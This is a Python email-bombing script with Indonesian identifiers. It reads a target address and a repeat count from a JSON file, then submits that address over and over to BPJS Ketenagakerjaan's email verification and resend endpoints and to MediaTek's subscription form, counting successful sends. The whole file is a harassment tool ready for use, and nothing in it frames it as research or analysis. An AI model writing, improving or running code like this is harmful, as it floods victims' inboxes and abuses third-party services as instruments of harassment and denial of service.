# -*- coding: utf-8 -*-
import requests, sys
sys.path.insert (0, "..")
from warna import *


jl = json.load (open ("e-mail.json"))
email = jl["email"]
jumlah = int(jl["jumlah"])
jeda = jl["jeda"]


def ulang():
	sys.stdout.flush ()
	system ("sleep "+ jeda)


def BPJS():
	try:
		for i in range (jumlah):
			post ("https://www.bpjsketenagakerjaan.go.id/pu/verifEmail", data = {"email": email}, headers = {"User-Agent": "Mozilla/8.0 (Linux; U; Android 8.1)"}).text
			rp = post ("https://www.bpjsketenagakerjaan.go.id/pu/resendEmail", data = {"email": email}, headers = {"User-Agent": "Mozilla/8.0 (Linux; U; Android 8.1)"}).text
			if "Sukses" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rEmail"+ ub +" BPJS Ketenagakerjaan"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		BPJS()


def MediaTek():
	try:
		for i in range (jumlah):
			br = Browser()
			br.set_handle_equiv(True)
			br.set_handle_referer(True)
			br.set_handle_robots(False)
			br.addheaders = [("User-Agent", "Mozilla/8.0 (Linux; U; Android 8.1)")]
			br.open ("https://www.mediatek.com")
			br.select_form(nr=1)
			br.form["fldfirstname"] = "IRUL"
			br.form["fldlastname"] = "IRUL"
			br.form["fldEmail"] = email
			rbs = br.submit().read()
			if "Activate Your Subscription" in rbs:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rEmail"+ um +" MediaTek"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except URLError:
		koneksi()
		MediaTek()


def irul():
	BPJS()
	MediaTek()
	enter()


irul()